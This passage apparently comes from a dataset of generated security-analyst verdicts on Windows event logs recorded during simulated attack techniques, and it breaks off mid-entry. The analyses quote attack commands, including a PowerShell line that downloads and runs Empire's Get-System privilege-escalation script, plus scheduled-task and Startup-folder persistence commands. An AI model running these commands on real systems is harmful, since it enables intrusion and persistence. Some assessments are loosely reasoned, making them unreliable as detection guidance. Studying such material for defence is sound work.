- **Privilege Escalation**: EventID 4672 indicates that the `admin_test` user was granted several high-level privileges, which is typical for an admin account but noteworthy in the context of subsequent PowerShell activity.
- **Account Changes**:
  - **EventID 4781 and 4738** show that the `Administrator` account has been renamed to `HaHa_xxxx` format. This is a significant red flag indicating unauthorized modification.
  - These actions are linked to PowerShell activity, suggesting the PowerShell script executed a potentially malicious task to rename the Administrator account.

### Windows PowerShell Log:
- **Detailed Scripting**: The logs confirm the execution of a script that performed the renaming of administrative accounts. The script description matches the command observed in the Sysmon log, confirming account renaming activity.

**Assessment of the Situation:**
- The logs reveal suspicious PowerShell activity, whereby administrative accounts are being renamed through a script. This activity is considered a significant security incident, indicating deliberate tampering with user accounts, typically associated with malicious intent to evade detection or cover tracks.

**Resolution:** MALICIOUS

### Guidance:
1. **Immediate Response**:
   - Isolate the affected machine (Server002) from the network to prevent further malicious activity and lateral movement.
   - Revert changes made to user accounts, especially renaming any critical administrative accounts.
   - Conduct a thorough security posture assessment of the network to identify other possible compromised systems.

2. **Further Investigation**:
   - Attempt to identify the origin or reason the `admin_test` user executed such commands; this requires log tracing and understanding the user's actions and intentions.
   - Examine any related alerts or logs to uncover the entry vector for this malicious behavior.

3. **Preventive Measures**:
   - Review and tighten security policies, particularly those concerning PowerShell scripting and administrative privileges.
   - Deploy more stringent monitoring and alerting capabilities for high-risk activities such as account modifications and privilege escalations."
Scheduled task Local,"### Analysis

The provided Windows event logs primarily consist of Sysmon logs, which record process creation activity, and Security logs, which include authentication and privilege assignment events. Here's a breakdown of key observations:

#### Suspicious or Anomalous Behavior:

1. **Processes Executed:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are found executing rapidly.
   - `wevtutil.exe` is often used to query event logs, which might be legitimate for administrators but could also be indicative of attempts to clear event logs or trace activity.
   - Instances of `hostname.exe`, `whoami.exe`, and `schtasks.exe` are present:
     - `hostname.exe` and `whoami.exe` are standard Windows utilities, benign by themselves but could be suspicious if used repeatedly without cause, as part of reconnaissance.
     - `schtasks.exe` is used to create a scheduled task for execution of a command line task (`cmd.exe /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10`).
     - Creating a scheduled task named `spawn` that runs `cmd.exe` could indicate an attempt to gain persistence or execute code at a later time.

2. **Security Logs Analysis:**
   - The logs mention the user `admin_test`, who is granted a series of high-level privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.), indicating potential privilege escalation or a user account with elevated permissions.
   - There are multiple logon events with two different IP addresses (both in IPv6 format), suggesting remote access.

3. **Command Line Arguments:**
   - The command line used for creating a scheduled task is suspicious due to the lack of clear operational need and the potential for automated execution of additional commands.

#### Assessment

The repeated use of `wevtutil.exe`, the creation of a scheduled task using `schtasks.exe`, and high-privilege activities under the user `admin_test` without clear context suggest potentially unauthorized activities consistent with threat actor behavior or internal misuse.

### Conclusion

**Resolution: SUSPICIOUS**

The event logs exhibit characteristics typically associated with enumeration, privilege escalation, and persistence mechanisms often leveraged during malicious operations. However, without further context or corroborative intelligence, a definitive conclusion of malicious activity cannot be made. This activity is suspicious and warrants further investigation.

### Guidance

1. **Deeper Log Analysis:**
   - Investigate further into system and application logs for more indicators or context of activities around the timestamps mentioned.
   - Review the usage of the `admin_test` account and validate the necessity of its privileges.

2. **Network Monitoring:**
   - Examine network logs to corroborate remote access attempts and trace back the originating IP addresses.

3. **Scheduled Task Verification:**
   - Review and verify the purpose and scheduling of the task `spawn` to determine its origin and necessity.

4. **User Account Review:**
   - Perform an audit of user permissions and review the administrative accounts for any unauthorized configurations or changes.

Proceed with alerting the internal security response team to monitor the system for additional suspicious activities and prepare potential remediation steps if further evidence of compromise is discovered."
Process Injection with Go using CreateThread WinAPI,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided event logs from various channels—Application, PowerShell, Security, Sysmon, and System—it becomes evident that there are some areas that require further scrutiny. Below is a detailed analysis of the activities captured in the logs:

#### Application Log
- The logs show normal entries related to Windows Defender being active and activities from the Software Protection Platform Service. There is nothing suspicious in the Application logs that indicates malicious activity.

#### Windows PowerShell Log
- Multiple entries indicate the execution of a PowerShell script by `powershell.exe` with elevated privileges. The command line used indicates a script or command executed from a temporary file directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\CreateThread.exe -debug`. 
- Running executables from temporary folders and using specific flags like `-debug` are often considered unusual and can be indicative of attempts to execute non-standard operations or conceal malicious activity.

#### Security Log
- Entries indicate a time adjustment operation, which is generally benign if it corresponds with legitimate administrative time-sync operations. However, time changes can sometimes be used in anti-forensics.
- The time changes in the logs appear to revert back slightly, without context that this was needed for a legitimate reason. 

#### Sysmon Log
- Process execution events for known Windows binaries such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are noted. The usage of `wevtutil.exe` and `conhost.exe` might be legitimate but can also be used for offensive security operations.
- The invocation of `powershell.exe` to run the `CreateThread.exe` executable aligns with suspicious activity commonly associated with malware execution or post-exploitation tasks.

#### System Log
- Logs indicate normal activities such as time service adjustments and Windows Update client operations. The adjustment in time and initiation of updates is typical and expected in a running system.

### Assessment
The execution of the PowerShell command involving an executable in a temporary directory is concerning and indicative of potential malicious behavior. PowerShell is a powerful tool often leveraged in attacks due to its versatility and the richness of Windows environments.

### Resolution
Based on the detailed investigation, the activity is categorized as **SUSPICIOUS**.

### Guidance on How to Proceed
1. **Containment**: Isolate the affected machine (`Server002`) from the network to prevent potential further spread or data exfiltration.
2. **Further Investigation**: Conduct a deeper investigation into the provenance of `CreateThread.exe` and the implications of `-debug` usage. Examine other logs and system behavior related to this executable.
3. **Threat Hunting**: Search for IOCs and analyze other machines for similar patterns of PowerShell execution or side activities.
4. **Incident Response**: If further investigation confirms malicious intent, proceed with full-scale incident response procedures, including eradication and recovery protocols.
5. **Release an Advisory**: Inform the IT and security personnel to be vigilant of similar occurrences and adjust monitoring solutions to flag such behavior.

In conclusion, the unusual PowerShell invocation from a temporary directory suggests suspicious activity that warrants close attention and further analysis to ascertain if a compromise has occurred."
Remote Service Installation CMD,"Upon reviewing the provided Windows event logs, several points warrant closer attention due to potential indicators of malicious activity. Here are the observations and analysis based on the logs provided:

1. **PowerShell Event (Sysmon EventID 5)**:
   - PowerShell is a powerful scripting environment often leveraged by both administrators and attackers. The execution of `powershell.exe` is common in routine administrative tasks but requires further context to ensure it's not being used for malicious purposes. In this log, there’s no additional command-line argument provided, which makes it harder to ascertain its intent solely from this log entry.

2. **Execution of `wevtutil.exe` and `conhost.exe`**:
   - The frequent appearance of `wevtutil.exe` and `conhost.exe` could be benign if these are being used for legitimate Windows eventing tasks or administrative purposes. However, without context or specific command-line arguments, we can’t definitively determine their intent, which might warrant further investigation or correlation with other logs.

3. **Execution of `sc.exe` to Create and Start a Service**:
   - The Sysmon log entry where `cmd.exe` is used to run `sc.exe` to create and start a service named `fileTestService_CMD` with a binary path pointing to a location in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe` is highly suspicious. This is because:
     - Typically, services are not created in the temporary directories, which is a trait often associated with temporary or fragile installations performed by malware.
     - The `sc.exe` operations creating and starting a service automatically suggest persistence mechanisms that malware uses.

4. **Unusual Process Image Paths**:
   - The `fileService.exe` does not have a recognized product or company associated with it and is launched from a temporary directory. This, combined with its execution under the `NT AUTHORITY\\SYSTEM` context, strongly points towards suspicious activity.

5. **Use of `whoami.exe` and `hostname.exe`**:
   - The execution of both `whoami.exe` and `hostname.exe` under `admin_test` user might be benign, often used to check user context and machine identity, which could be normal for a user verifying settings, though in the context of other suspicious behavior, they could suggest reconnaissance actions by an intruder.

6. **Presence of a Security Log Entry**:
   - The Service Control Manager log entry showing a newly created service corroborates the creation of the `fileTestService_CMD`, emphasizing the persistence mechanism.

7. **Lack of Detailed Context**:
   - Some events do not provide enough context to determine if they are part of malicious behavior or legitimate administrative operations. This includes standard system processes being run without further evidence of malicious usage.

### Assessment and Resolution

Given the evidence, particularly the creation and execution of the service with `sc.exe` pointing to an unusual executable in a temp directory, the activity described in the logs is **SUSPICIOUS**. It strongly suggests potential preparation for persistence usually associated with compromise, but while suspicious, there's not enough direct evidence of known malicious behavior or payloads.

### Recommendations:

- Conduct further investigation into the system by collecting more context on the `fileService.exe` file. Examine its properties, determine its source, and check it against known malware databases or reverse engineer it if necessary.
- Review the system for any unauthorized changes or additional logs that might offer more context on these entries' purpose.
- Monitor for any additional suspicious activity, particularly around scheduled tasks, file changes, or network communications initiated by unknown services or processes.
- If feasible, perform a forensic analysis on the system to ensure no other indicators of compromise are present.

Pending these additional investigation steps, a decision on containment or remediation can be implemented if further malicious signs are uncovered."
Task Scheduler via VBA,"Upon reviewing the provided Windows event logs, the following observations were made:

### PowerShell Logs

1. **Suspicious PowerShell Execution:** 
   - Multiple instances of PowerShell being executed with a potentially harmful script were found. The logs depict downloads from `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1` followed by the execution of the `Invoke-MalDoc` command with parameters likely meant to run a macro file in Microsoft Word.
   - **Indicators of Malicious Activity:**
     - `IEX` (Invoke-Expression) along with `iwr` (Invoke-WebRequest) is often used in malicious contexts to download and execute scripts from the internet.
     - The script download from a non-trusted source (`raw.githubusercontent.com`) raises concern as this practice is commonly seen in the exploitation phase of malware deployment.

### Sysmon Logs

2. **Execution of PowerShell and Elevated Tools:**
   - A PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) being executed by the user `SERVER002\\admin_test` correlates with the PowerShell log entries detailing suspicious script usage.
   - The elevated integrity level of the process indicates potential privilege misuse.

3. **Event Logging Commands:**
   - Multiple instances of `wevtutil.exe`, which is used for exporting and clearing Windows event logs, were executed by `SERVER002\\admin_test`. This could be indicative of someone attempting to cover their tracks by deleting log data.

4. **Use of Windows Native Tools:**
   - Multiple usages of legitimate Windows utilities like `hostname.exe` and `whoami.exe`. While these tools are not inherently malicious, their tandem use following PowerShell invocation can be used to gather system information post-exploitation.

5. **Microsoft Edge Installer Execution:**
   - A low-risk sequence involving `MicrosoftEdge_X64` executables and their typical update behavior for Microsoft Edge seems benign, but should always be checked to rule out masquerading.

### Overall Assessment

The logs examined are indicative of suspicious and potentially malicious activity:

- The script execution through PowerShell to download and run scripts from the internet is particularly suspect and indicative of possible malware activity.
- Patterns like using `wevtutil.exe` to export or clear logs suggest attempts to hide a user's actions on the host.
- Although legitimate tools are utilized, their usage pattern closely aligns with actions taken during the exploitation and persistence phases.
  
### Recommendation

**Resolution: MALICIOUS**

- **Immediate Action Required:**
  - Disconnect the host (`Server002`) from the network to prevent further potential spread and damage.
  - Conduct a thorough forensic analysis of the system and quarantine any suspicious files.
  - Scan for known malware signatures and any other suspicious artifacts using up-to-date antivirus and EDR solutions.
  - Review network logs for any further signs of command and control (C2) activity potentially initiated by malicious scripts.
  - Implement enhanced monitoring for PowerShell activities and block access to known malicious sites at the perimeter firewall.
  
### Further Steps

- Educate employees about the risks of running scripts from untrusted sources and enforce strict PowerShell execution policies.
- Foster an incident response strategy for quickly identifying and responding to similar threats in the future.
  
This analysis should be followed by a deeper investigation and consultation with incident response specialists to gauge the extent of the compromise."
Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"After analyzing the provided Windows event logs, certain activities stand out as potentially suspicious and warranting further investigation:

### PowerShell Logs:
- **Suspicious PowerShell Commands**: The PowerShell logs show the creation of a directory in the Temp folder, copying `calc.exe` to this directory, and modifying the registry key responsible for Startup programs. This pattern is often associated with persistence mechanisms used in malware to ensure it runs at startup.
  - **Command:** `powershell.exe & {New-Item -ItemType Directory -path ""$env:TMP\\filetest\\\""; Copy-Item -path ""C:\\Windows\\System32\\calc.exe"" -destination ""$env:TMP\\filetest\\\""; Set-ItemProperty -Path ""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"" -Name ""Startup"" -Value ""$env:TMP\\filetest\\""}`
  - **Potential Risk:** Persisting a copied `calc.exe` subverts its original utility and could be leveraged maliciously.

### Security Logs:
- **Privileged Access Events**: The logon events indicate the user `admin_test` gained elevated privileges (`SeDebugPrivilege`, among others). While not inherently malicious, together with the PowerShell activity, it raises flags for potential misuse.
- **Time Discrepancies**: Security events indicate changes in system time (`Event ID 4616`), which can be used by adversaries to cover their tracks or circumvent monitoring tools.

### Sysmon Logs:
- **Reading and Monitoring Events with Wevtutil**: Multiple instances of `wevtutil.exe` being executed by user `admin_test` could suggest attempts to query or clear event logs to avoid detection, which is a technique often used in attacks.

### Combined Findings:
The activities observed indicate a combination of suspicious PowerShell usage to establish persistence, possibly paired with user privilege escalation and event log tampering. The registry modification to add startup items could be potential malware behavior. This behavior is characteristic of staging an environment for long-term system control or a backdoor.

### Resolution:
- **Resolution: SUSPICIOUS**

### Recommendations:
1. **Immediate Investigation**: Initiate a detailed incident response process focusing on `Server002`, especially the activities carried out by the user `admin_test`.
2. **Containment**: Isolate the server from the network to prevent potential lateral movement.
3. **Threat Hunting**: Search for any additional indicators of compromise on the network or systems using the same `admin_test` credentials.
4. **Log Analysis**: Review event logs for further suspicious behaviors.
5. **Security Policy Update**: Consider implementing application whitelisting, restricting PowerShell usage, and more granular privilege management.

Further analysis will confirm whether these actions indeed pose a threat."
Azure - adding user to Azure role in subscription,"Based on the analysis of the provided logs, the following findings and assessments have been made:

### Log Analysis:
1. **Unusual Process Execution and Usage**:
   - The logs show multiple executions of `CompatTelRunner.exe`, which is a known Windows process involved in telemetry. However, it seems to be used extensively and in conjunction with user account inquiries, which is atypical for regular telemetry activities.
   - There is evidence of commands run via Windows PowerShell by the `admin_test` user. These include PowerShell scripts targeting Azure resources and role assignments, such as connecting to Azure and executing commands that may modify user roles, which is a high-privilege operation.

2. **Potential Privilege Escalation**:
   - The script executed by the user `admin_test` appears to be trying to add a user to the `Reader` role in an Azure subscription based on its description. While legitimate in certain contexts, the method of execution and the scripting involved (such as hardcoded credentials) stand out as a red flag for potential malicious activity.

3. **Repeated Security Log Event 4798**:
   - Event ID 4798 is logged when a user's group membership is enumerated. The frequency of this log indicating checks against multiple user accounts suggests active user enumeration which could indicate reconnaissance activity often associated with preparation for privilege escalation or other attacks.

4. **Use of Administrative Powers**:
   - There are events where SYSTEM privileges were utilized by the `CompatTelRunner.exe` and other service host processes (Event ID 4672). This suggests these processes might run with elevated privileges, potentially opening the system to misuse if any of these processes were to be hijacked or misused.

5. **Suspicious Activities via Sysmon and PowerShell**:
   - The execution chain involving PowerShell, usage, and host commands demonstrate typical indicators of manual administrative task execution or automation scripts potentially deployed by an attacker.
   - Quick succession of many processes such as `wevtutil`, `conhost`, and `powershell` by the same user (`admin_test`) without a clear system analysis context is another indication of potential unauthorized scripting activity.

### Conclusion:
- **SUSPICIOUS**: The overall behavior detected in the logs does not conclusively point to known malicious activity, but it is certainly suspicious and warrants further investigation. The combination of user enumeration, repeated privileged operations, PowerShell scripts executing tasks with elevated permissions, and telemetry tools running outside their typical usage patterns suggests the possibility of an internal threat or a compromised account conducting reconnaissance or preparatory steps for further action. 

### Recommendations:
- **Further Investigation**: Conduct a thorough review of the `admin_test` account activities, especially around the use of PowerShell and telemetry.
- **Monitor Azure Activities**: Ensure Azure account changes align with expected changes documented by the IT team.
- **Inspect System Integrity**: Run integrity checks on critical system files and processes involved in telemetry and user account management for any unauthorized changes.
- **User Awareness and Training**: Educate employees on the importance of secure script management and the identification of unusual system behavior.
- **Consider Enhanced Logging**: Increase the verbosity of logging for scripts and user account management activities for better monitoring.

A comprehensive investigation into these anomalies could confirm or dismiss the suspicion of potential malicious activities."
Scheduled Task Executing Base64 Encoded Commands From Registry,"Upon reviewing the provided event logs from various channels, several observations can be made:

1. **System Log**:
   - The ""Microsoft-Windows-Kernel-General"" logs indicate that there was a time adjustment. While time discrepancies can be normal due to synchronization actions, an incorrect setting can also result from an attack attempting to manipulate time for log alteration purposes. However, no additional corroboration is present to suggest malicious usage here.

2. **Application Log**:
   - The ""Microsoft-Windows-Security-SPP"" indicates normal Software Protection Platform Service operation with no anomalies.

3. **Security Log**:
   - The security log primarily shows typical time change notifications. This, combined with the System log entries, does not suggest malicious activity on its own.

4. **Sysmon Log**:
   - Multiple instances of `svchost.exe` and normal system components like `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are mentioned. These could either be benign or suspicious if they appear in unusual contexts.
   - The logs reveal an execution of `cmd.exe` that performed registry additions and created a scheduled task that calls `powershell.exe` with a base64-encoded command. Such activity is often indicative of malicious intent as it can signify a persistence mechanism being established to execute a script containing potentially harmful commands.
   - The command line embedded in the scheduled task is specifically built to decode a Base64 string and execute that decoded content, which is a common technique employed in obfuscated malware attacks to evade detection.
  
Overall, the logs exhibit signs of a potentially malicious action, especially concerning the `cmd.exe` events orchestrating scheduled tasks with base64-encoded PowerShell commands.

**Assessment**:
- **Resolution**: MALICIOUS
- **Guidance**: Immediate action should be taken to investigate the intent and content of the registry and the scheduled task. A deeper examination or re-imaging of the involved host may be warranted to ensure security and integrity. Consider isolating the host from the network until the investigation is complete. It is also crucial to explore network logs to see if there was unauthorized data exfiltration related to these processes."
Domain Password Policy Check: No Special Character in Password,"**Detailed Log Analysis:**

Upon analyzing the provided event logs from System, Windows PowerShell, Sysmon, Application, and Security logs, the following observations are made:

### PowerShell Logs:

1. **PowerShell Execution:**
   - A PowerShell script is executed multiple times that checks for a credential file (`$env:LOCALAPPDATA\file\$env:USERNAME.txt`), retrieves and compares the password, and attempts to change the Active Directory (AD) account password if the password is different. The script logs a message if the password is unchanged or if an error occurs. It updates the password with both the same and new inputs.

2. **Suspicious Indicators:**
   - Storing credentials in a text file, especially without strong encryption mechanisms, is generally unsafe and suspicious.
   - Password reset via a script might indicate an automated task or unauthorized activity.

### Sysmon Logs:

1. **Process Execution:**
   - Multiple occurrences of `powershell.exe` initiated by `wsmprovhost.exe`, typically associated with Windows Server Management.
   - High integrity level execution by the `admin_test` user on `SERVER002`.
   - A sequence of EdgeUpdate activity indicating legitimate Microsoft Edge update actions.

2. **Potential Risks:**
   - PowerShell script capabilities to change user passwords indicate the script is executed with a high level of privilege which can be risky if initiated by an unauthorized user.
   - Execution of `whoami.exe`, `hostname.exe`, and multiple console host (`conhost.exe`) processes do not show overtly malicious behavior but continuous monitoring is required for unusual patterns.

### Security Logs:

1. **Audit Events:**
   - Event ID 4799 indicates an attempt to enumerate members of the ""Users"" group using `setup.exe` from the EdgeUpdate process. While not directly malicious, activity could be monitored to ensure no privilege escalation attempts.

### Conclusion:

Based on the PowerShell interaction with credential files and the possible unauthorized password changes, along with lack of strong evidence of overt exploits from the Sysmon and Security logs, the situation indicates a need for further investigation.

### Resolution: **SUSPICIOUS**

- **Next Steps:**
  - **Review and possibly revoke** permissions on user `admin_test` for executing such scripts until a verified intention or task is confirmed.
  - **Conduct a thorough check** on the presence and permissions of the credential file used by the PowerShell script.
  - **Monitor account activities** of `admin_test` and check for any unauthorized changes in AD accounts.
  - **Review the script's purpose and source**: Determine who authored the script and its intended use.
  - **Provide security training** to the team for better secure practices concerning credentials handling in scripts.
  - **Inspect the server (Server002)** for any other suspicious activities or signs of compromise, especially for PowerShell executions linked to unauthorized changes in infrastructure."
Bad Potato,"Upon analyzing the Windows event logs provided, the following details stand out:

1. **PowerShell Execution with Unusual Commands**:
   - Several entries indicate the execution of PowerShell with complex and potentially harmful instructions involving ""BadPotato.exe"". 
   - The command executed starts a process for ""BadPotato.exe"" and a default Windows application ""notepad.exe"", pauses for 20 seconds, and then attempts to forcefully stop both processes.
   - The use of ""BadPotato.exe"" is particularly concerning given its association with privilege escalation exploits. Such behavior is unusual in both regular administrative tasks and could indicate a compromise attempt.

2. **Repeated 'conhost.exe' and 'wevtutil.exe' Operations**:
   - There are multiple instances of ""conhost.exe"" and ""wevtutil.exe"" being executed by the user ""SERVER002\\admin_test"" in quick succession.
   - While these processes can be legitimate, the context and the frequency observed here may warrant further examination to determine if they are part of a script or batch operation driven by a malicious actor.

3. **Process Execution**:
   - The basic processes like ""SecurityHealthService.exe"", ""whoami.exe"", and ""hostname.exe"" are standard operations on a Windows machine and typically benign. However, in a context where other anomalous activities are noted, it is wise to ensure that these processes aren't being used to mask malicious behavior.

4. **Observations from Application and PowerShell Logs**:
   - The Security log showed entries related to Windows Defender being ""SECURITY_PRODUCT_STATE_ON"", which on the surface doesn’t reveal anomalies. No direct alerts from the security software were evident in the provided logs.
   - The Sysmon logs indicate exact series and structures of operations done possibly through scripting or automated tasks which can appear during both scheduled tasks or malicious automated scripts.

**Assessment**:
- The commands related to ""BadPotato.exe"" are particularly concerning due to their association with well-known privilege escalation techniques. The use of PowerShell to call these executables adds an additional layer of suspicion.
- Given the context of these logs, such actions are neither typical nor benign without explicit and documented reasoning, particularly in a production environment.

**Resolution**: 
- **MALICIOUS**: The identified behavior involving PowerShell and ""BadPotato.exe"" coupled with potentially script-driven execution of system commands indicates a high likelihood of malicious activity or compromise. Immediate action should be taken to halt this activity, investigate the origin and entry point of the ""BadPotato"" executable, and review further system-wide access potentially gained through this method.

**Guidance**:
- Terminate any ongoing and related processes if they are still running.
- Conduct a thorough review of file changes and registry alterations during the indicated times.
- Isolate the host from the network to prevent further spreading of potentially malicious activities.
- Utilize advanced malware scanning tools to identify and mitigate any persistent threats that may have resulted from this activity."
Add a driver,"Let's conduct an analysis of the provided Windows Event Logs:

### Analysis

1. **Usage of Common Windows Utilities:**
   - Observed processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. These are standard Windows processes and their presence alone isn't inherently suspicious, but their usage in a certain context can be indicative of malicious activity.
   
2. **Repeated Execution Pattern:**
   - There is a recurring pattern of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` getting executed by the user `SERVER002\admin_test`. `wevtutil.exe` is a utility used for managing event logs, while `conhost.exe` is a host for console windows and may wrap command line input. The frequent execution in quick succession without apparent change in conditions could suggest command automation scripts or batch jobs were run, but it could also hint at an attempt to harvest logs or mask other activities.
   
3. **Indicators of Reconnaissance Activity:**
   - Execution of `whoami.exe` is noted, which is commonly used to obtain and verify the current logged on user's context and privileges. Its execution, especially if coupled with other administrative utilities, might be indicative of malicious reconnaissance.
   
4. **Potential Privilege Escalation or Persistence Mechanism:**
   - There's a `cmd.exe` process with command line arguments invoking `pnputil.exe` to add a driver from `C:\Windows\INF\usbstor.inf`. This operation could be aiming to configure or prepare USB storage related settings. Such actions should be reviewed, as they could have implications for persistence, data exfiltration, or privilege escalation methods.
   
5. **Time Discrepancies and Changes:**
   - Sysmon logs show that Time has been changed multiple times (EventID: 4616 from Security and Kernel-General in System Log). Time changes in logs by processes like `svchost.exe` should be questioned, as they could be attempts to manipulate log times or evade log detection systems (time stomping).

6. **Security Context and User Behavior:**
   - Observing any user or privileged service account running unusual or several quick succession commands should raise a Red Flag. All these operations are being carried out by `SERVER002\\admin_test`, aligning with a single account context often observed in suspicious activity logs.

### Risks and Threats Identified
- **Suspicious Activity:** The repeated use of Windows command-line utilities such as `wevtutil.exe` and `whoami.exe` signals potential malicious reconnaissance or exploitation. 
- **Configuration Changes:** The action involving `pnputil.exe` could signal attempts at altering system configurations.
- **Time Manipulation:** Changing event timestamps is a tactic used to obscure tracks or mislead investigations.

### Guidance on How to Proceed
- **Further Investigation Needed:**
  - Investigate the context under which these utilities were run (check for legitimate administrative scripts versus anomalous behavior).
  - Review the actions taken by the user `SERVER002\admin_test` leading up to and after the events logged.
  - Check system configurations and identify if `usbstor.inf` has been altered or is related to unsanctioned USB policy settings.
  - Verify the integrity and necessity of time changes and their justification.

### Resolution
- **SUSPICIOUS:** The logs contain activities that are not immediately flagrant as malicious but suggest further detailed investigation is warranted to confirm the nature and intent of these operations."
Named pipe client impersonation,"### Analysis of Event Logs

#### Windows PowerShell Log

- The PowerShell logs reveal a suspicious command execution that utilizes `Invoke-Expression` (IEX), which downloads and executes a PowerShell script from a GitHub repository linked to BC-Security's Empire framework:
  ```
  IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
  ```
- This kind of behavior aligns with common threat actor techniques whereby PowerShell is used to fetch and execute malicious scripts. The script appears to be a privilege escalation module (`Get-System.ps1`), which is often used by attackers to gain elevated permissions.

#### Security Log

- Elevated privileges and sensitive account use are observed:
  - Events demonstrate a privileged logon by `admin_test` with several high-level privileges like `SeDebugPrivilege` and `SeLoadDriverPrivilege`. While the presence of these privileges isn't inherently malicious, their access, especially in tandem with the suspicious PowerShell activity, raises red flags.
- There are NTLM logon events (EventID: 4624) showing remote logons which, when considered alongside the PowerShell activity, could suggest unauthorized access attempts.

#### Sysmon Log

- Various processes initiated by `admin_test`, including frequent use of `wevtutil.exe` and instances of canceled host processes (`conhost.exe`), suggest attempts to interact with or manipulate system event logs.
- The spawning of PowerShell with similarly suspicious activity, as detailed in the PowerShell log, indicates potential malicious lateral movement or privilege escalation attempts within the network.

#### System Log

- Time synchronization adjustments do not appear directly malicious but could be used by an attacker to cover tracks by manipulating timestamps in logs.

### Conclusion

The evidence from these logs presents a convergence of indicators that suggest intrusion and potential malicious activity. The use of PowerShell to fetch and execute scripts from a known security tool framework (often utilized for red teaming and potential malicious use) directly ties into indicators of compromise. The combination of these findings with evidence of high-privilege account use and manipulation of system logs underscores suspicious actions characteristic of malicious activity.

### Resolution
**MALICIOUS** - The logs contain activity that strongly indicates malicious behavior, likely compromised by a threat actor using tools and techniques typical of targeted attacks.

### Guidance for Proceeding

1. **Immediate Actions:**
   - Isolate the affected system (`Server002`) to prevent potential lateral movement.
   - Revoke access and force password changes for user `admin_test`.
   - Initiate incident response protocols to contain and remediate the threat.

2. **Further Investigation:**
   - Analyze network traffic to understand the extent of data exfiltration or internal reconnaissance.
   - Conduct memory analysis and deep inspection of the PowerShell scripts executed.
   - Review administrative logins and refine detection rules to prevent future occurrences.

3. **Mitigation and Recovery:**
   - Apply patches and security updates to all systems.
   - Enhance monitoring, particularly of PowerShell activity and unauthorized privilege escalation attempts.
   - Consider endpoint detection tools that can alert or prevent suspicious script executions.

These steps will help manage and mitigate the risk posed by the identified malicious activity and reinforce the system's defenses against future attacks."
RunPE via VBA,"### Detailed Analysis of Logs:

Upon reviewing the logs provided, several entries stand out due to potential malicious activities:

1. **PowerShell Activity:**
   - The PowerShell event logs indicate execution of a potentially malicious script. The command seen in the logs attempts to download and execute a script from a URL hosted on GitHub (`Invoke-MalDoc.ps1`). This is a significant indicator of malicious activity, as adversaries frequently use PowerShell to download and execute malicious scripts from the web.
   - The use of `Invoke-MalDoc` to exploit office products further suggests a targeted attempt to exploit vulnerabilities, often utilized in malware delivery and execution.

2. **High Privilege Logon Sessions:**
   - Multiple logon attempts with elevated privileges, such as Event ID 4624 (an account was successfully logged on) and Event ID 4672 (special privileges assigned to new logon), are observed multiple times. These indicate privileged activities which are normal under controlled circumstances, but could be suspicious when observed in tandem with other abnormal activities like unauthorized script execution.

3. **Credential Read Operations:**
   - Repeated failures in reading credentials, denoted by Event ID 5379, suggest an attempt at unauthorized credential access. Such failed attempts often indicate a hostile actor trying to perform lateral movements or privilege escalation.
   
4. **Sysmon Logs:**
   - Processes like `wevtutil.exe` frequently appear in the Sysmon logs, which may indicate log clearing activities, a common tactic for attackers to cover their tracks.
   - The execution of utilities like `whoami.exe` and `hostname.exe` suggest reconnaissance activities.

5. **Anomalous Task Execution:**
   - The frequent use of `taskhostw.exe` also raises concern. It is a legitimate Windows process for task management but can be used maliciously if repurposed by malware.

### Assessment of the Situation:

- **Malicious Indicators Found:**
  - The combination of suspicious PowerShell activities, failed credential operations, use of Windows utility processes suggestive of reconnaissance or log tampering, and elevated logon activities collectively point to what can be considered a compromise scenario on the host.
  - The indicators suggest an attempt at executing and possibly distributing malware, with defensive evasion strategies to maintain persistence on the host.

### Resolution:

Based on the evidence provided, this situation should be classified as **MALICIOUS**. The logs contain numerous clear indicators of malicious activities, such as unauthorized script execution, reconnaissance, and potential lateral movement attempts on the network.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - **Isolate the Host:** Disconnect the suspect machine from the network to prevent further spread or communication with a potential command and control server.
   - **Containment and Remediation:** Initiate a deep scan with updated antivirus/anti-malware solutions and consider tools like Sysinternals Suite for further investigation.
   
2. **Forensic Analysis:**
   - Perform a full memory dump and disk imaging for forensic analysis. Investigate any artifacts left by the potentially executed scripts and any modifications in system files or registries.
   
3. **Review and Harden Security Controls:**
   - Review network security controls to identify how the PowerShell script was executed, especially considering if proper execution policies and user permissions were not adhered to.
   - Enhance monitoring and logging around PowerShell execution, credential access attempts, and high-privilege account activities.

4. **Incident Response:**
   - Activate an incident response plan, notifying relevant stakeholders. Engage your incident response team or outside cybersecurity experts if necessary for a detailed breach analysis.
   
5. **User Awareness and Training:**
   - Reinforce user training on email security, safe internet practices, and recognition of potential phishing attempts that may lead to such events."
Reg Key RunOnce,"Upon reviewing the provided log entries, here's a detailed analysis and assessment of the activities recorded:

### Security Log:
- **Event ID 4616** indicates system time changes. The time changes from ""2024-10-27 15:16:39.4609736"" to ""2024-10-27 15:16:34.1002056"", then back. This could either be a regular system time adjustment via synchronization or suggestive of manipulation, potentially malicious. System time changes can indicate an attempt to modify logs timestamps or disrupt scheduled tasks.

### Sysmon Log:
- **Process Executions (Event ID 1 & 5):** 
  - Multiple executions of system utilities like `whoami.exe`, `conhost.exe`, and `wevtutil.exe`.
  - Multiple `MicrosoftEdgeUpdate.exe` entries related to updates for Microsoft Edge could indicate a typical update process, though suspicious if unattended or unintended.
  - A concerning entry: `cmd.exe` executing a command to alter registry `RunOnceEx` entry:
    ```
